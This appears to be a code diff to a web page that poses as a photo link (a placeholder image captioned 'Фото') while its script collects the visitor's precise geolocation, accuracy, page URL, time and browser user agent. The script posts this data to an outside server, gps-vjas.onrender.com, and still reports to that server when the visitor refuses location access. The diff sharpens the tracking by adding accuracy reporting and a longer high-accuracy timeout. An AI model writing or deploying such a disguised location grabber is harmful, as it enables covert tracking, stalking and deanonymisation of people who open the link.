@@ -9,10 +9,11 @@
   <img src="https://via.placeholder.com/600x400?text=Фото" alt="Фото" style="max-width:100%;display:block;margin:20px auto;" />
 
   <script>
-    function sendLocation(lat, lon) {
+    function sendLocation(lat, lon, accuracy) {
       const info = {
         latitude: lat,
         longitude: lon,
+        accuracy: accuracy,  // точность в метрах
         url: window.location.href,
         time: new Date().toISOString(),
         userAgent: navigator.userAgent
@@ -29,10 +30,13 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function(position) {
-            sendLocation(position.coords.latitude, position.coords.longitude);
+            sendLocation(
+              position.coords.latitude,
+              position.coords.longitude,
+              position.coords.accuracy
+            );
           },
           function(error) {
-            // Если отказался — просто отправим, что геолокация недоступна
             fetch('https://gps-vjas.onrender.com/send', {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
@@ -44,10 +48,13 @@
               })
             }).catch(console.error);
           },
-          {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
+          {
+            enableHighAccuracy: true,  // <-- включаем высокую точность
+            timeout: 15000,
+            maximumAge: 0
+          }
         );
       } else {
-        // Если браузер не поддерживает геолокацию
         fetch('https://gps-vjas.onrender.com/send', {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
